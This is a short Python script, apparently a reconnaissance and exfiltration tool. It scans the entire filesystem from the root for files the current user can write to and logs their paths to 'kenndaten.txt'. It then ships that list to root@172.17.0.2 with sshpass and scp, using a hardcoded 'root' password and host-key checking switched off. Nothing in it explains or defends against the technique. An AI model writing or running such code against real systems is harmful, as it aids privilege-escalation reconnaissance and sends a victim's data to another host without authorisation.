import os
import paramiko
def find_editable_files(directory):
    editable_files = []
    daten = open("kenndaten.txt","a")
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if os.access(file_path, os.W_OK):
                editable_files.append(file_path)
                daten.write(file_path+"\n")
    return editable_files

find = find_editable_files("/")
ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no kenndaten.txt "+ "root"+"@172.17.0.2:/root/../"
os.system(ostring)
